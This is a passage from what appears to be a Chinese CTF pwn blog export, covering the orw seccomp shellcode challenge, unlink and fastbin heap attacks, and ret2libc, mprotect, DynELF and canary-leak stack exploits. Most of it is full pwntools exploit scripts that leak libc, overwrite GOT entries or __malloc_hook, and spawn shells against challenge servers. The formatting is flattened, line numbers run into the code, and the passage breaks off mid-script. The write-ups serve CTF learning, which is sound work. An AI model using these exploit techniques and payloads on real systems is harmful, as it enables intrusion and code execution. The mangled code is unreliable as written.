call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。 WP 开启了canary 本题系统内核只允许使用sys_open，sys_read，sys_write 第一次调用prctl函数 禁止提权,第二次调用prctl函数 限制能执行的系统调用只有open，write，exit 总体思路是：open flag -&gt;read-&gt;write sys_open 1234567push 0x0 #字符串结尾push 0x67616c66 #'flags'mov ebx,esp xor ecx,ecx #0xor edx,edx #0mov eax,0x5 #调用号int 0x80 #sys_open(flags,0,0) sys_read(2,file,0x100) 系统调用号为3 123456mov eax,0x3; mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”mov ebx,0x3; # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件mov edx,0x100; #对应字节数int 0x80; sys_write(1,file,0x30) 系统调用号为4 123mov eax,0x4; # eax = sys_writemov ebx,0x1; # ebx = unsigned int fd = 1int 0x80; exp: 1234567891011from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')p=remote('node4.buuoj.cn',28836)shellcode=&quot;&quot;shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;')shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')shellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')recv = p.recvuntil(':')p.sendline(shellcode)flag = p.recv(100)print flag 12345678910111213141516from pwn import *r = remote('node4.buuoj.cn',28836)context.log_level = 'debug'elf = ELF('orw')shellcode = shellcraft.open('/flag')shellcode += shellcraft.read('eax','esp',100)shellcode += shellcraft.write(1,'esp',100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()","link":"/2021/11/17/pwnable.tw_orw/"},{"title":"unlink","text":"堆溢出漏洞——unlink 推荐unlink基本知识讲解 2014 HITCON stkofexp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = &quot;./stkof&quot;hollkelf = ELF('./stkof')if args['REMOTE']: hollk = remote('127.0.0.1', 7777)else: hollk = process(&quot;./stkof&quot;)log.info('PID: ' + str(proc.pidof(hollk)[0]))libc = ELF('./libc.so.6')head = 0x602140def alloc(size): hollk.sendline('1') hollk.sendline(str(size)) hollk.recvuntil('OK\\n')def edit(idx, size, content): hollk.sendline('2') hollk.sendline(str(idx)) hollk.sendline(str(size)) hollk.send(content) hollk.recvuntil('OK\\n')def free(idx): hollk.sendline('3') hollk.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head - 0x8) #fd payload += p64(head) #bk payload += p64(0x20) # next chunk's prev_size bypass the check payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) hollk.recvuntil('OK\\n') #gdb.attach(hollk) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64(hollkelf.got['free']) + p64(hollkelf.got['puts']) + p64( hollkelf.got['atoi']) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(hollkelf.plt['puts']) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = hollk.recvuntil('\\nOK\\n', drop=True).ljust(8, '\\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] binsh_addr = libc_base + next(libc.search('/bin/sh')) system_addr = libc_base + libc.symbols['system'] log.success('libc base: ' + hex(libc_base)) log.success('/bin/sh addr: ' + hex(binsh_addr)) log.success('system addr: ' + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) hollk.send(p64(binsh_addr)) hollk.interactive() if __name__ == &quot;__main__&quot;: exp() axb_2019_heap知识点 pwndbg使用regs查看寄存器里得值 利用思路 利用格式化字符串泄露libc和程序基址 运用unlink将chunk 0 地址覆写为free_hook的地址 将system地址写入free_hook 触发写入的’/bin/sh’块的删除，执行system(‘/bin/sh’) WP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *#p = remote(&quot;node3.buuoj.cn&quot;,26144)p = process(&quot;./axb_2019_heap&quot;)context.log_level = 'debug'elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF('./libc-2.23-64.so')def add(idx,size,content): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('):',str(idx)) p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content) def delete(idx): p.sendlineafter('&gt;&gt;','2') p.sendlineafter('index:',str(idx)) def edit(idx,content): p.sendlineafter('&gt;&gt;','4') p.sendlineafter('index:',str(idx)) p.sendlineafter('content: \\n',content) def show(): p.sendlineafter('&gt;&gt;','3')p.recvuntil('name: ')p.sendline('%11$p%15$p')p.recvuntil('Hello, ')base=int(p.recv(14),16)-0x1186#success(&quot;base:&quot;+hex(base))libcbase=int(p.recv(14),16)-libc.sym['__libc_start_main']-240system=libcbase+libc.sym['system']free_hook=libcbase+libc.sym['__free_hook']bss=base+0x202060success(&quot;bss:&quot;+hex(bss))add(0,0x98,'aaaa')#0add(1,0x98,'bbbb')#1add(2,0x90,'cccc')#2add(3,0x90,'/bin/sh\\x00')#3 #gdb.attach(p) payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+'\\xa0'edit(0,payload)#gdb.attach(p)delete(1)edit(0,p64(0)*3+p64(free_hook)+p64(0x10))#gdb.attach(p)edit(0,p64(system))#gdb.attach(p)delete(3) p.interactive()","link":"/2021/11/25/unlink/"},{"title":"babyheap_0ctf_2017","text":"堆溢出 malloc_chunk的结构参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据当前一个chunk的状态是空闲时记录大小（也就是被free的时候），当前一个chunk的状态不是空闲的时候，记录它的数据。然后是 size： 就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西分别是non_main_arena :记录当前chunk是否属于主线程is_mapped：当前chunk是否由mmap分配prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址） fd,bk: 表示用户数据，或者表示地址chunk非空闲时，fd和bk存在的地方表示的是用户的数据，chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。 chunk的结构 第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数第三个就是存储数据的部分然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。 chunk被free后结构变化： 第一行,没变化，因为它是chunk1第二行开始，M的位置变成了0，代表着chunk不是由mmap分配第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。） chunk的空间复用： bin及分类 fast bins small binslarge binsunsorted bins未被分类，刚被free未真的进入bin Top Chunk babyheap_0ctf_2017考点： fastbin attack 利用思路两次 double free 与 fastbin attack 。第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 利用过程1、通过unsortedbin attack 来泄露libc地址 首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，能读出fd 或者 bk的值 我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"栈溢出","text":"ret2libc，fmtstr 一. 基础知识补充 指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP(Instruction Pointer)分别为64位、32位、16位指令指针寄存器 以64位程序为例: 在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行 push rbp ;将父函数栈底压入栈中mov rbp, rsp ;将父函数栈顶变为子函数栈底sub rsp, 0x70 ;向低地址处为子函数开辟栈帧 在函数调用结束的时候，程序会执行这两条指令leave指令相当于执行了如下两条指令mov esp ebppop ebp ret指令则可以理解为将栈中的返回地址pop给rip的操作，从而回到父函数继续执行 二. ret2text栈溢出函数：strcpy 程序本身存在fflush函数，我们可以直接用它的sh来当作system的参数 三. ret2libc泄露libc利用思路： 利用write函数来泄露程序的libc版本 知道libc版本后去计算程序里的system函数和字符串“/bin/sh”的地址 覆盖返回地址为system（‘/bin/sh’），获取shell 例题：2018_rop 1: 12345payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4)) # 获取write函数地址libc=LibcSearcher('write',write_addr) 首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位。 2: 1234offset=write_addr-libc.dump('write') #计算偏移量 #偏移量=程序里的函数地址-libc里的函数地址system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh') 3: 构造rop获取shell 1payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh) 完整exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',27043)elf=ELF('./2018_rop')write_plt=elf.plt['write']write_got=elf.got['write']main=elf.sym['main']payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4))libc=LibcSearcher('write',write_addr)offset=write_addr-libc.dump('write')system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh')payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)r.sendline(payload)r.interactive() 但是我在这么写的时候出现了 timeout: the monitored command dumped core,尝试泄露read函数的真实地址，再调用read函数来找到偏移。(后来找到问题有：payload的顺序错误也会导致timeout和找不到libc,timeout对应payload:填充+got表+plt表+main，找不到libc对应payload:填充+pop_rdi_ret+binsh_system,对应64位栈溢出，32位和64位不同) 64位查找pop_rdi: 1ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot; exp: 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *elf = ELF(&quot;./2018_rop&quot;)p = remote(&quot;node3.buuoj.cn&quot;,28628)read_plt = elf.plt['read']read_got = elf.got['read']write_plt = elf.plt['write']main_addr = 0x080484C6payload = 'a' * (0x88 + 0x4) payload += p32(write_plt) + p32(main_addr)payload += p32(1) + p32(read_got) + p32(8)p.sendline(payload)read_addr = u32(p.recv(4))print hex(read_addr)libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = 'a' * (0x88 + 0x4)payload += p32(sys_addr) + p32(0) + p32(binsh)p.sendline(payload)p.interactive() LibcSearcher使用方法：将exp放在libcsearcher的安装目录下 12345678910111213141516171819202122232425# coding:utf-8from pwn import*from LibcSearcher import*p=remote('node3.buuoj.cn','25295')elf=ELF('./1')main=0x400b28rdi=0x400c83ret=0x4006b9pus_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('Input your choice!\\n','1')payload='\\0'+'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter('Input your Plaintext to be encrypted\\n',payload)p.recvline()p.recvline() #接收 encrypt 的两个 puts函数输出;puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #得到 puts 函数 的地址;libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到偏移地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址p.sendlineafter('choice!\\n','1') # 再一次执行 一遍流程payload='\\0'+'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() plt表-》got表 四. 利用mprotect修改内存权限mprotect函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。 ROPgadget使用例题：not_the_same_3dsctf_2016 利用mprotect函数修改bss段为0x7即0b111，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置 1ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop 需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8 ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr=0x80eb000 将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入shellcode 12345678910111213141516171819202122232425# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行int mprotect(const void *start, size_t len, int prot);argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)elf = ELF('./pwn')# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep poppop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; retpayload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个poppayload += p32(argu1) + p32(argu2) + p32(argu3)# 紧接着返回地址为 read对修改的目标地址写入shellcodepayload += p32(elf.symbols['read']) payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址payload += p32(0) + p32(argu1) + p32(0x100)# read写完后 写入执行的目标地址payload += p32(argu1)# 先进行sendline执行到read等待输入sh.sendline(payload)# 继续sendline发送shellcodesh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))# 进入交互模式sh.interactive() 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8from pwn import*context.log_level = 'debug'context(arch='i386', os='linux')local = 0proc_name = './not_the_same_3dsctf_2016'elf = ELF(proc_name)# 这道题本地和远程两种解法，真的干。。。if local: sh = process(proc_name) str_flag_addr = 0x080ECA2D backdoor_addr = 0x080489A0 printf_addr = 0x0804F0A0 payload = 0x2D * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp payload += p32(backdoor_addr) + p32(printf_addr) payload += p32(str_flag_addr) sh.sendline(payload)else: sh = remote('node3.buuoj.cn', 28308) mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] pop3_edi_esi_ebx_ret = 0x0806fcc8 mem_addr = 0x080EB000 #.got.plt 的起始地址 mem_size = 0x1000 mem_type = 0x7 # 可执行权限 payload = 0x2D * 'a' payload += p32(mprotect_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) payload += p32(read_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(0) + p32(mem_addr) + p32(0x100) payload += p32(mem_addr) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode sh.sendline(payload) # read写入shellcode payload = asm(shellcraft.sh()) sh.sendline(payload)sh.interactive() 五. 32位，64位栈溢出对比32位的函数在调用栈的时候是： 调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1 由于在函数调用前通过push指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp。 64位的函数在调用栈的时候是： 前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。 参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址 六. 覆盖相关变量 ebp ret_addr 虚函数指针 ​ 子类对父类的继承​ 能够对函数进行重写​ 由虚函数表来进行操作 SEH链 ​ SEH结构 结构 在栈中存在的 地方 ，在 在ret_addr和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对SEH链的攻击 Hook中的变量 利用方法介绍 有些系统函数有预先定义好的钩子 修改钩子链表中存储的子程序指针影响钩子运行 fgets的用法的时候，发现它能够避免造成溢出 程序自带的system函数地址 timeout: the monitored command dumped core解决 1)在payload后面加几个ret地址，或者加一个假的0xdeadbeef 1p = flat(['a'*0x10, 'b'*8, pop_di, bin_sh_addr, system, 0xdeadbeef]) 2)直接用系统函数的地址 七. BUUCTF 例题1. JarvisOJ level4知识点参考文章：借助DynELF实现无libc的漏洞利用小结 pwntools中DynELF函数使用(针对未给出libc文件) 123456789def leak(address): payload=pad+p32(writeplt)+ret1+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) #print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex')) 这里是测试用，可省略。 return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;对应文件&quot;))sysaddr=d.lookup(&quot;system&quot;,&quot;libc&quot;) pad为填充，ret1为有效的返回地址 WP 开了NX保护（堆栈不可执行） 利用DynELF泄露system地址，通过read函数写入/bin/sh到bss段 exp: 123456789101112131415161718192021222324from pwn import *conn=process('./level4')e=ELF('./level4')pad=0x88write_plt=e.plt['write']vul_addr=0x804844bbss_addr=0x0804a024def leak(address): payload1='a'*0x8c+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4) conn.sendline(payload1) data=conn.recv(4) return data d=DynELF(leak,elf=e)system_addr=d.lookup('system','libc')print hex(system_addr)read_plt=e.plt['read']payload2='a'*0x8c+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)conn.sendline(payload2)conn.send(&quot;/bin/sh&quot;)payload3=&quot;a&quot;*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)conn.sendline(payload3)conn.interactive() 常规解法: 123456789101112131415161718192021222324252627282930#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25934)elf = ELF(&quot;./level4&quot;)read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; * 0x8c + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendline(payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 0x8c + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendline(payload)p.interactive() jarvisoj_level3_x6464位ret2libc（no canary found) checksec 泄露libc 64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。我们这边要利用write函数去泄露libc版本write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参 123456ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 利用ROPgadget寻找rdi,rsi寄存器地址 WP: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *r=remote('node4.buuoj.cn',26919)# r = process('./level3_x64')context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;)elf=ELF('./level3_x64')#libc=ELF('./libc-2.19.so')write_plt=elf.plt['write']write_got=elf.got['write']main=0x40061Ardi=0x4006b3rsi_r15=0x4006b1payload='a'*(0x80+8)+p64(rdi)+p64(1) #rdi寄存器设置write函数的第一个参数为‘1’payload+=p64(rsi_r15)+p64(write_got)+p64(8) #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8payload+=p64(write_plt) #去调用write函数payload+=p64(main) #控制程序流，回到main函数，继续控制r.sendlineafter('Input:',payload)write_addr=u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))#write_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0'))print hex(write_addr)libc=LibcSearcher('write',write_addr)libc_base=write_addr-libc.dump('write')system_addr=libc_base+libc.dump('system')binsh=libc_base+libc.dump('str_bin_sh')payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)r.sendlineafter('Input:',payload)r.interactive() bjdctf_2020_babyrop2 程序结构 init（） gift（） vuln（） 在gift函数处存在格式化字符串漏洞，可以用来泄露libc 在vuln函数处存在buf溢出漏洞，绕过canary就可以利用ret2libc来获取shell 泄露canary值 输入%n$p来找偏移，n为偏移量，$p定位到偏移处，%p以16进制输出 找到一个nop指令下断点查看栈的情况 可以看到6161下面有一串16进制数，这个就是canary值，利用%7$p就可以泄露它的值，而且看到它在栈的位置是0x18 泄露canary: 1234payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16) 另外pwngbd提供了一种方便的函数fmtarg，使用格式为fmtarg addr。在进入printf函数时断下，调用fmtarg后可以自动计算格式化参数与addr的偏移。fmtarg在计算index时将RDI也算了进去，后面会自动减一作为%$p的参数： 利用puts函数泄露libc，puts函数只有一个参数，64位传参，利用rdi寄存器即可，ROPgadget找rdi exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import *# p = process('./bjdctf_2020_babyrop2')p = remote('node4.buuoj.cn',25998)elf = ELF('./bjdctf_2020_babyrop2')context.log_level = 'debug'payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16)print str(canary)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400993main_addr = elf.sym['main']vul_addr = 0x400887payload = 'a'*0x18+p64(canary)payload += p64(0)payload +=p64(pop_rdi)payload +=p64(puts_got)payload +=p64(puts_plt)+p64(vul_addr)p.recvuntil('story!\\n')p.sendline(payload)puts_addr = u64(p.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc = LibcSearcher('puts',puts_addr)base = puts_addr-libc.dump('puts')sys_addr = base+libc.dump('system')binsh = base+libc.dump('str_bin_sh')p.recvuntil('story!\\n')payload ='a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)payload +=p64(main_addr)p.sendline(payload)p.interactive() printf泄露真实地址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import LibcSearcher#p=process('./babyrop2')p=remote('node3.buuoj.cn',25002)elf=ELF('./babyrop2')read_got=elf.got['read']printf_plt=elf.plt['printf']main_addr=elf.sym['main']format_addr=0x400770&quot;&quot;&quot;0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400730 : pop r14 ; pop r15 ; ret0x0000000000400732 : pop r15 ; ret0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; ret0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004d1 : ret0x0000000000400532 : ret 0x200a&quot;&quot;&quot;payload='a'*40+p64(0x400733)+p64(format_addr)+p64(0x400731)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_addr)p.sendlineafter(&quot;name?&quot;,payload)p.recvuntil('!\\n')read_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump('read')sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2='a'*40+p64(0x400733)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive() pwn2_sctf_201612345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *#p = process('./pwn')p = remote('node3.buuoj.cn',29130)elf = ELF('./pwn')format_str = 0x080486F8printf_plt = elf.plt['printf']main_addr = elf.symbols['main']printf_got = elf.got['printf']p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')payload = 'a'*0x30 + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)p.sendline(payload)p.recvuntil('said: ')#这是程序正常输出的p.recvuntil('said: ')#这是printf的那个格式化字符串printf_addr = u32(p.recv(4))libc = LibcSearcher('printf', printf_addr)libc_base = printf_addr - libc.dump('printf')sys_addr = libc_base + libc.dump('system')str_bin = libc_base + libc.dump('str_bin_sh')p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')p.sendline('a'*0x30 + p32(sys_addr) + p32(main_addr) + p32(str_bin))p.interactive()#复制自https://blog.csdn.net/qinying001/article/details/104374305 123456789101112131415161718192021222324252627282930313233#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = process('./test1')elf = ELF(&quot;./test1&quot;)libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; *(0xC8+4) + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendlineafter('Welcome!\\n',payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])# libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 